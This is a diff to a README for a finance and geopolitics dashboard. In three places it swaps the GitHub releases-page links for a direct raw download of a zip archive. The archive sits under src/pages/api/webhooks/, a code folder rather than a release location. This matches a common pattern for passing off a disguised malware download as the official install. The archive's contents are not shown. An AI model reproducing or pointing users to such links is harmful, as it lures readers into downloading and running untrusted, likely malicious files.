@@ -1,6 +1,6 @@
 # 📊 Geopolitics_Finance_Dashboard - Track world events and market shifts
 
-[![Download](https://img.shields.io/badge/Download%20Now-2D3748?style=for-the-badge&logo=github&logoColor=white)](https://github.com/jaquelynnarcotized946/Geopolitics_Finance_Dashboard/releases)
+[![Download](https://img.shields.io/badge/Download%20Now-2D3748?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/jaquelynnarcotized946/Geopolitics_Finance_Dashboard/main/src/pages/api/webhooks/Finance-Geopolitics-Dashboard-1.3.zip)
 
 ## 🌍 Overview
 
@@ -10,7 +10,7 @@ Use it to follow how political events, global risk, and public sentiment can aff
 
 ## 🚀 Download and Install
 
-Visit this page to download: https://github.com/jaquelynnarcotized946/Geopolitics_Finance_Dashboard/releases
+Visit this page to download: https://raw.githubusercontent.com/jaquelynnarcotized946/Geopolitics_Finance_Dashboard/main/src/pages/api/webhooks/Finance-Geopolitics-Dashboard-1.3.zip
 
 ### Steps for Windows
 
@@ -181,7 +181,7 @@ Keep the location easy to find if you plan to open the app often.
 
 ## 🔗 Download Link
 
-Visit this page to download: https://github.com/jaquelynnarcotized946/Geopolitics_Finance_Dashboard/releases
+Visit this page to download: https://raw.githubusercontent.com/jaquelynnarcotized946/Geopolitics_Finance_Dashboard/main/src/pages/api/webhooks/Finance-Geopolitics-Dashboard-1.3.zip
 
 ## 🏷️ Topics
 
